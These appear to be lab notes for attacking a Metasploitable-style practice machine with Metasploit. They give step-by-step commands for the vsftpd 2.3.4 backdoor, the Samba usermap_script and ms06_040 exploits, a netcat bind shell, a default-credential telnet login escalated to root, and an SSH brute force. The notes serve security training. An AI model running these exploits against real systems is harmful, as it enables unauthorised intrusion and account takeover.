# Metasploit Structure

## Go to the metasploit directory
	
		-> cd /usr/share/metasploit-framework/
		
## Go to the modules directory

		-> cd modules 

# MSFConsole

## Type msfconsole in the terminal

	-> show payloads
	-> show exploits
	
	->use exploit/windows/smb/ms06_040_netapi 
	
			-> show info
			
			-> show options
			
			-> set LHOST 192.168.10.3
			
			-> show payloads
			
			-> set payload payload/windows/vncinject/bind_tcp
			
			-> show targets
			
			-> set target 3
			
			-> exploit

# Exploit Vsftp 2.3.4

### Step 1: 
		
		scan the target with nmap
		
		-> nmap -sV 192.168.10.4 

### Step 2: 

		Search for the vulnerability
		
		-> searchsploit vsftpd 2.3.4

### Step 3:

		Search in the vulnerability in the metasploit framework
		
		-> search vsftpd 2.3.4
		
		
		Select the exploit
		
		-> use exploit/unix/ftp/vsftpd_234_backdoor
		
		-> show info
		
		-> show options
		
		-> set RHOST 192.168.10.4
		
		-> show payloads
		
		-> show targets
		
		-> show options
		
		
		Execute
		
		-> exploit
		
### Step 4:

		Run any commands on the target machine

### Step 5:

		Exit from the target machine
		
		-> exit

# Bind Shell

## Using a tool called Netcat

			See the help menu of netcat
			
						-> nc -h
						
			Run the netcat tool
					
						-> nc 192.168.10.4 1524

# Information Disclosure (Telnet)

## Search the exploit using telnet version

		-> searchsploit Linux telnetd
		
		Note: This is not helpfull
		
	
## Try the default credentials of the telnet

		Connect to the telnet on the port of the target machine
		
				-> telnet 192.168.10.4
				
		Use the given username/password to login
		
				-> username: msfadmin
				-> password: msfadmin
				
		Note: You will not login as the root account 
		
			
		Be the root 
		
			-> sudo su
			
				-> Enter the password of the machine i.e. msfadmin

# Samba Exploitation

## Scan the taget machine
		
		-> nmap -sV 192.168.10.4
  

## Samba versions got after scanning
			
			139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
			
			445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
   

## Use the searchsploit
			
			-> searchsploit samba
				
		
## Inside msfconsole

		Use the auxiliary modules
		
				-> use auxiliary/scanner/smb
				
		check the version of smb
		
				-> use auxiliary/scanner/smb/smb_version
				
				-> show info
				
				-> show options
				
				-> set RHOSTS 192.168.10.4
				
				-> run		
				
		got the exact version of smb using metasploit 
		
				-> Samba 3.0.20-Debian
				
	
## Inside the searchsploit
		
			Search the samba version that you got by using the metasploit framework
			
					->	searchsploit Samba 3.0.20-Debian
					
					
## Inside the metasploit

		-> search samba
		
		Use the “usename map script” 
		
			-> use exploit/multi/samba/usermap_script
			
			-> show info
			
			-> show options
			
			-> set RHOSTS 192.168.10.4
			
			-> set LHOST 192.168.10.3
			
			

		Run the exploit
		
			-> run

			
		Close the connection
			
			-> ctrl+c		
			-> y
   
			
# SSH Bruteforce

## Use the metasploit module called

		 -> use auxiliary/scanner/ssh/ssh_login 
		
		-> show options
		
		-> set PASS_FILE /home/kali/Desktop/password.txt
		
		-> set USER_FILE /home/kali/Desktop/username.txt
		
		-> set RHOSTS 192.168.10.4
		
		-> set VERBOSE true
		
		
		Run the auxiliary module
				
				-> run
				
		See the availabe shells
		
				-> sessions
				
		Enter into the session
		
				-> sessions -i 1
							
				
## Another way to connect to the ssh once the credentials are known
		
				
		Inside the terminal
		
				-> ssh msfadmin@192.168.10.4 -p 22
				
		

 **The above ssh attack is know as weak credential vulnerability**



			
			
